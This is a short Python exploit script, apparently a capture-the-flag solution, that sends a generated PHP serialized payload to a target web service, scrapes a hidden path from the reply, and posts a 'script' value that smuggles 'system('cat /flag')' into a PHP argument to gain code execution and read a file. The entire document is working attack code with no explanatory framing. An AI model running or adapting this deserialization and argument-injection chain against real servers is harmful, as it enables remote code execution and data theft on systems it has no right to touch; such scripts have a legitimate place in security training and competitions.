import json
import requests
import sys
import subprocess
import re

IPPORT = sys.argv[1]
PORT = 3322

def get_ser_payload():
    out = subprocess.check_output(['/usr/local/opt/php@7.4/bin/php', 'gen.php'])
    out = out.decode().split()
    return out[-1]
def payload_gen():
    pld = get_ser_payload()
    data = {'password': 0, 'data': [], 'hash': None}
    data['access'] = pld
    return json.dumps(data)

r = requests.get('http://{}/'.format(IPPORT), params={'payload': payload_gen()}, allow_redirects=False)

match = re.findall(r"\/(.*)\"", r.text)[0]

r = requests.post('http://{}/{}run'.format(IPPORT,match), data={'script': '-r system(\'cat /flag\'); //.php', 'param': ''})
print(r.text)
